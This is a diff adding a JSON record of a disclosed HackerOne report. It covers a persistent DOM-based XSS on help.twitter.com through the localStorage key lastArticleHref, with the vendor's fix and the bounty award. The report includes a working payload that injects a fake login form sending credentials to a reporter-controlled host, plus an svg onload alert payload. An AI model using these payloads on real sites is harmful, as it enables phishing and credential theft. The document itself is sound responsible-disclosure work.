@@ -1,0 +1,346 @@
+{
+  "id": 297968,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc5Njg=",
+  "url": "https://hackerone.com/reports/297968",
+  "title": "Persistent DOM-based XSS in https://help.twitter.com via localStorage",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-14T18:47:34.673Z",
+  "submitted_at": "2017-12-14T18:47:34.673Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "harisec",
+    "url": "/harisec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "X (Formerly Twitter)",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-02-24T00:03:54.935Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-02-17T15:42:35.594Z",
+  "team_member_agreed_on_going_public_at": "2018-02-24T00:03:54.802Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \n\nI've found a DOM-based XSS vulnerability in the website **help.twitter.com** that persists via a localStorage key **lastArticleHref**. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.\n\n**Description:** \n\nThe website **help.twitter.com** contains JavaScript code that will save the value of the current page (the value of the browser property **location.href**) into a localStorage key named **lastArticleBreadcrumbs**.\n\nThe JavaScript code is loaded from this URL:\nhttps://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js\n\nThere are two relevant localStorage keys:\n*  **lastArticleBreadcrumbs** - that contains an array of breadcrumbs such as `[\"Help Center\",\" Following and unfollowing\",\" How to approve or deny follower requests\"]`\n*  **lastArticleHref** -  that contains the URL of the last visited article\n\nWhen these two localStorage keys are present, the following code is executed:\n\n```\nthis.lastArticleBreadcrumbs.shift();\n                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {\n                        return r === e.lastArticleBreadcrumbs.length - 1 ? '<a class=\"hp03__link  twtr-type--roman-16\" href=\"' + e.lastArticleHref + '\">' + t + \"</a>\" : '<span class=\"hp03__breadcrumb  twtr-color--light-gray-neutral\">' + t + \"</span>\"\n                    });\n                    this.breadcrumbElement.innerHTML = t.join('<span class=\"hp03__seperator    twtr-color--light-gray-neutral\">/</span>')\n```\n\nAs you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable **e.lastArticleHref**. This variable is loaded from the localStorage key **lastArticleHref**.\n\nThe value of **e.lastArticleHref** is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via `this.breadcrumbElement.innerHTML`.\n\nThis allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key **lastArticleHref**.\n\nThe exploit scenario is as follows:\n\n1. The victim visits an URL like `https://help.twitter.com/en/using-twitter/follow-requests#\"><zzzz>`\n2. The JavaScript code from the page will set the value of localStorage key **lastArticleHref** to `https://help.twitter.com/en/using-twitter/follow-requests#\\\"><zzzz>`.\n3. The user visits the homepage `https://help.twitter.com/`.\n4. At this point the value of the localStorage key **lastArticleHref** is loaded and used to dynamically generate some HTML code that is written into the DOM.\n5. The victim can now open a new window/tab and visit `https://help.twitter.com/`. The HTML code set by attacker will appear in the page as the value of the localStorage key **lastArticleHref** will remain set to an XSS payload.\n\nI was not able to bypass CSP and I've prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.\n\n## Steps To Reproduce:\n\nI've attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.\n\n### Chrome\nTo reproduce, using Google Chrome follow the next steps:\n\n* Visit the following URL using Google Chrome:\n\n```\nhttps://help.twitter.com/en/using-twitter/follow-requests#\"></a></div></div></div></div></div></div></div></div></div></div></div></div><br><br><br><br><br><br><br><br><br><br><br><br><div style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'>Please sign in below:<br><form action=https://bugs.thx.bz/just>username:<input type=text name=u><br>password:<input type=password name=p><br><input type=submit value='Sign in'></form><br></div>\n```\n\n* At this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.\n* Visit the homepage https://help.twitter.com/\n* A fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain **bugs.thx.bz**.\n\n### Internet Explorer 11\n\nTo reproduce, using Internet Explorer follow the next steps:\n\n* Visit the following URL using Internet Explorer 11:\n\n```\nhttps://help.twitter.com/en/using-twitter/follow-requests#\"><svg/onload=alert(1)>\n```\n\n* At this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.\n* Visit the homepage https://help.twitter.com/\n* A popup should appear as proof that JavaScript execution is possible.\n\n## Supporting Material/References:\n\nI've attached two movies to this report.\n*  One demonstrating the issue using Google Chrome and the login form.\n*  Another one using IE11 to execute JavaScript code in the context of the domain **help.twitter.com**.\n\n## Impact\n\nAn attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim's credentials.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 246936,
+      "file_name": "chrome-screenshot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/936/9d3610082d50b0b41f23daf04488282e0acd2e56/chrome-screenshot.png?response-content-disposition=attachment%3B%20filename%3D%22chrome-screenshot.png%22%3B%20filename%2A%3DUTF-8%27%27chrome-screenshot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075452Z&X-Amz-Expires=948&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=df86fb282f9facd93ecf1d72afecb12ac53836ef2b8da902a64fa70903a31ffe",
+      "file_size": 188916,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 246937,
+      "file_name": "chrome-login-page.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/937/6aa2cdbf8eb38ac4ae41ad47e21ffb391f02628c/chrome-login-page.mp4?response-content-disposition=attachment%3B%20filename%3D%22chrome-login-page.mp4%22%3B%20filename%2A%3DUTF-8%27%27chrome-login-page.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075452Z&X-Amz-Expires=948&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=38b0be0cc104aeb20631a49678daeb2dc90134e84db6e73e4739a03b437e0b5c",
+      "file_size": 3598004,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 246938,
+      "file_name": "ie-xss.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/938/a54d850f661bf10def5bff03d21e72d3951fdce9/ie-xss.mp4?response-content-disposition=attachment%3B%20filename%3D%22ie-xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27ie-xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075452Z&X-Amz-Expires=948&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1efdd0df22f67ebc011e7c31a26911bfc342fd37462cf752592e4b1f7a3a59f6",
+      "file_size": 889128,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-19T15:42:35.707Z",
+  "allow_singular_disclosure_after": -173981536.6476066,
+  "singular_disclosure_allowed": true,
+  "vote_count": 82,
+  "voters": [
+    "zhchbin",
+    "jokebookservice1",
+    "sp1d3rs",
+    "stefanofinding",
+    "foobar7",
+    "kapytein",
+    "bogdantcaciuc",
+    "yumi",
+    "spam404",
+    "ta8ahi",
+    "and 72 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2223800,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for your report.\n\nWe're looking into it, and we'll keep you updated when we have additional information.\n\nThank you for thinking of Twitter security.",
+      "automated_response": false,
+      "created_at": "2017-12-14T19:49:20.517Z",
+      "updated_at": "2017-12-14T19:49:35.984Z",
+      "actor": {
+        "username": "bugtriage-michael",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-michael",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    },
+    {
+      "id": 2227127,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!",
+      "automated_response": false,
+      "created_at": "2017-12-15T18:33:19.107Z",
+      "updated_at": "2017-12-15T18:33:19.107Z",
+      "actor": {
+        "username": "aarun",
+        "cleared": false,
+        "verified": false,
+        "url": "/aarun",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/486/bcf774a6460ff9e33545235af9344be33732008d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    },
+    {
+      "id": 2238300,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "@harisec - We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!",
+      "automated_response": false,
+      "created_at": "2017-12-20T17:19:28.956Z",
+      "updated_at": "2017-12-20T17:19:28.956Z",
+      "actor": {
+        "username": "aarun",
+        "cleared": false,
+        "verified": false,
+        "url": "/aarun",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/486/bcf774a6460ff9e33545235af9344be33732008d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "harisec",
+        "url": "/harisec"
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    },
+    {
+      "id": 2238327,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I can confirm this issue was fixed. I'm not able to reproduce it anymore.\n\nI've identified the fix in the JavaScript file **articles.js** - instead of saving the full URL (`location.href`), only the value of `location.pathname` is saved. \n\n```\nu.default.set(\"lastArticleHref\", \"\" + window.location.origin + window.location.pathname)\n```",
+      "automated_response": false,
+      "created_at": "2017-12-20T17:26:29.721Z",
+      "updated_at": "2017-12-20T17:26:29.721Z",
+      "actor": {
+        "username": "harisec",
+        "cleared": true,
+        "verified": true,
+        "url": "/harisec",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    },
+    {
+      "id": 2241061,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thanks again for helping us keep Twitter safe and secure for our users!",
+      "automated_response": false,
+      "created_at": "2017-12-21T20:07:09.699Z",
+      "updated_at": "2017-12-21T20:07:09.699Z",
+      "actor": {
+        "url": "/x",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "profile": {
+          "name": "X (Formerly Twitter)"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "x",
+      "collaborator": {
+        "username": "harisec",
+        "url": "/harisec"
+      }
+    },
+    {
+      "id": 2394841,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "If it's not a problem, I would like to make this report public. Thanks!",
+      "automated_response": false,
+      "created_at": "2018-02-17T15:42:35.633Z",
+      "updated_at": "2018-02-17T15:42:35.633Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "harisec",
+        "cleared": true,
+        "verified": true,
+        "url": "/harisec",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    },
+    {
+      "id": 2427533,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-24T00:03:54.859Z",
+      "updated_at": "2018-02-24T00:03:54.859Z",
+      "actor": {
+        "username": "andrewsorensen",
+        "cleared": false,
+        "verified": false,
+        "url": "/andrewsorensen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    },
+    {
+      "id": 2427534,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-24T00:03:54.982Z",
+      "updated_at": "2018-02-24T00:03:54.982Z",
+      "actor": {
+        "username": "andrewsorensen",
+        "cleared": false,
+        "verified": false,
+        "url": "/andrewsorensen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "x"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
